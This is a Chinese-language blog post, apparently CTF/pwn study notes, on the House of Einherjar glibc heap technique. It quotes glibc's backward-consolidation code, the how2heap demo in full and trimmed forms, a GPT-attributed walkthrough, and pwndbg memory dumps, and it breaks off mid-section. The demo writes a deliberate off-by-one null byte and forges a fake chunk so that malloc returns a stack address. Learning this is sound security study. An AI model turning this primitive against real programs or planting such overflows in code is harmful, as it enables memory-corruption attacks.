<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>house_of_einherjar | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>house_of_einherjar</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-10-09T20:32:49.000Z" id="date"> 2023-10-09</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-10-09T15:08:38.880Z" id="updated"> 2023-10-09</time></div></span></div></div><hr><div id="post-content"><p><em>来玩把祖玛吧</em><br>利用的是free的后向合并</p>
<p>free函数后向合并关键代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*consolidate backward*/</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p))&#123;<span class="hljs-comment">//判断被释放堆块p的inuse标志位是否为0，如果为0则进行if中的内容，相当于一个检查。通过这个点说明我们至少要通过堆溢出去覆盖掉相邻高地址位的inuse标志位，最常见的方式就是off-by-one</span><br>    prevsize p-&gt;prev size;<span class="hljs-comment">//记录相邻堆块p的prev_size值</span><br>    size += prev_size;<span class="hljs-comment">//size为size + prev_size</span><br>    p = chunk_at_offset(p,-((<span class="hljs-type">long</span>)prevsize));<span class="hljs-comment">//堆块p的指针最后由chunk_at_offset()函数决定，chunk_at_offset()函数如下图，作用是将原本p指针位置加上s偏移后的位置作为合并堆块的新指针。那么带回到free函数中，意思就是原本p指针需要减去（向后）一个后向堆块size（p-&gt;prev_size）大小的偏移后得到合并堆块的新指针</span><br>    unlink(av, p, bck, fwd);<span class="hljs-comment">//unlink检查</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>debug程序来自how2heap<br>还是放个原程序在这吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc house_of_einherjar.c -g -o einherjar</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Credit to st4g3r for publishing this technique</span><br><span class="hljs-comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span><br><span class="hljs-comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar!\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 18.04.4 64bit.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br>	<span class="hljs-type">uint8_t</span>* a;<br>	<span class="hljs-type">uint8_t</span>* b;<br>	<span class="hljs-type">uint8_t</span>* d;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br>	a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br>   <br>	<span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br>	<span class="hljs-comment">// create a fake chunk</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br>	<span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>	fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br>	fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br>	fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br>	fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>	fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>	fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br>	<span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span><br>	b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f8</span>);<br>	<span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x4f8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>	<span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>	<span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x500) | prev_inuse = 0x501\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>	<span class="hljs-comment">/* VULNERABILITY */</span><br>	a[real_a_size] = <span class="hljs-number">0</span>; <br>	<span class="hljs-comment">/* VULNERABILITY */</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br>		   <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br>		   <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br>	<span class="hljs-comment">// Write a fake prev_size to the end of a</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br>		   <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>	<span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br>	*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>	<span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br>	fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br>	<span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);<br>	<span class="hljs-built_in">free</span>(b);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-comment">//if we allocate another chunk before we free b we will need to </span><br>	<span class="hljs-comment">//do two things: </span><br>	<span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br>	<span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br>	<span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br>	<span class="hljs-comment">//at the location we control. </span><br>	<span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br>	<span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span><br>	<span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br>	<span class="hljs-comment">//wilderness</span><br>	<span class="hljs-comment">//</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br>	d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br><br>	assert((<span class="hljs-type">long</span>)d == (<span class="hljs-type">long</span>)&amp;fake_chunk[<span class="hljs-number">2</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>我去除了大部分的英文<br>但保留了漏洞利用<br>这样才知道打的是house_of_einherjar(doge)<br>其实是方便调试<br>如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc house_of_einherjar.c -g -o einherjar</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><br>	<span class="hljs-type">uint8_t</span>* a;<br>	<span class="hljs-type">uint8_t</span>* b;<br>	<span class="hljs-type">uint8_t</span>* d;<br>	<span class="hljs-comment">//create 0x48(0x38+0x10)size chunka </span><br>	a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br>   <br>	<span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br>	<span class="hljs-comment">// create a fake chunk</span><br><br>	<span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br>	fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <br>	fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <br>	fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <br>	fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <br>	fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <br>	fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <br><br>	<span class="hljs-comment">//create 0x508(0x4f8+0x10) chunkb </span><br>	b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f8</span>);<br>	<span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><br>	<span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br>	a[real_a_size] = <span class="hljs-number">0</span>; <br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>	<span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br>	*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>	fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br>	<span class="hljs-built_in">free</span>(b);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><br>	d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br><br>	assert((<span class="hljs-type">long</span>)d == (<span class="hljs-type">long</span>)&amp;fake_chunk[<span class="hljs-number">2</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
<p><em>from GPT</em></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs text">变量声明：程序声明了三个指向 uint8_t 类型的指针变量 a, b, d，用于存储内存地址。<br><br>a = (uint8_t*) malloc(0x38);：通过 malloc 函数分配了 0x38 字节大小的内存，并将其起始地址赋给变量 a。<br><br>输出地址：使用 printf 语句打印变量 a 的地址。<br><br>int real_a_size = malloc_usable_size(a);：使用 malloc_usable_size 函数获取由 malloc 分配的实际可使用的内存大小，并将结果保存在变量 real_a_size 中。<br><br>打印实际大小：打印变量 real_a_size 的值。<br><br>声明数组变量：声明了一个名为 fake_chunk 的大小为 6 的 size_t 类型的数组。<br><br>初始化数组：给数组元素赋值。这个数组用于构造一个假的堆块结构。<br><br>输出数组内容：使用 printf 打印数组 fake_chunk 中的内容。<br><br>b = (uint8_t*) malloc(0x4f8);：通过 malloc 函数分配了 0x4f8 字节大小的内存，并将其起始地址赋给变量 b。<br><br>获取实际大小：使用 malloc_usable_size 函数获取由 malloc 分配的实际可使用的内存大小，并将结果保存在变量 real_b_size 中。<br><br>输出地址：打印变量 b 的地址。<br><br>uint64_t* b_size_ptr = (uint64_t*)(b - 8);：声明一个指向 uint64_t 类型的指针变量 b_size_ptr，并将其指向变量 b 前面 8 个字节。<br><br>输出 b.size：打印变量 b_size_ptr 的值，即变量 b 前面 8 个字节中保存的数值。<br><br>内存溢出：通过写入 a[real_a_size] = 0;，在变量 a 的末尾写入一个字节的数据，可能导致溢出。<br><br>输出 b.size：再次打印变量 b_size_ptr 的值，查看是否受到内存溢出的影响。<br><br>计算假的 prev_size：通过计算两个内存地址之间的偏移量来计算假的 prev_size 值。<br><br>写入假的 prev_size：将计算得到的假的 prev_size 值写入 a 的末尾，以模拟一个被溢出修改的堆块。<br><br>更新 fake_chunk[1]：更新数组 fake_chunk 的第二个元素，使其与假的 prev_size 值保持一致。<br><br>释放 b：使用 free 函数释放变量 b 所指向的内存块。<br><br>输出 fake chunk 大小：打印更新后的假的堆块大小。<br><br>d = malloc(0x200);：通过 malloc 函数分配了 0x200 字节大小的内存，并将其起始地址赋给变量 d。<br><br>输出下一个分配的地址：打印变量 d 的地址。<br><br>使用 assert 函数进行断言判断：判断变量 d 是否等于 &amp;fake_chunk[2]。<br></code></pre></td></tr></table></figure>
<p>程序先创建了以下两个堆块和中间一个“堆块”<br>chunka</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">8</span>gx <span class="hljs-number">0x555555757250</span><br><span class="hljs-number">0x555555757250</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000041</span><br><span class="hljs-number">0x555555757260</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757270</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757280</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure>
<p>fake_chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffffffe2c0</span><br><span class="hljs-number">0x7fffffffe2c0</span>:	<span class="hljs-number">0x0000000000000100</span>	<span class="hljs-number">0x0000000000000100</span><br><span class="hljs-number">0x7fffffffe2d0</span>:	<span class="hljs-number">0x00007fffffffe2c0</span>	<span class="hljs-number">0x00007fffffffe2c0</span><br><span class="hljs-number">0x7fffffffe2e0</span>:	<span class="hljs-number">0x00007fffffffe2c0</span>	<span class="hljs-number">0x00007fffffffe2c0</span><br><span class="hljs-number">0x7fffffffe2f0</span>:	<span class="hljs-number">0x00007fffffffe3e0</span>	<span class="hljs-number">0x574290d927ca7a00</span><br><span class="hljs-number">0x7fffffffe300</span>:	<span class="hljs-number">0x0000555555554ae0</span>	<span class="hljs-number">0x00007ffff7a03c87</span><br></code></pre></td></tr></table></figure>
<p>chunkb</p>
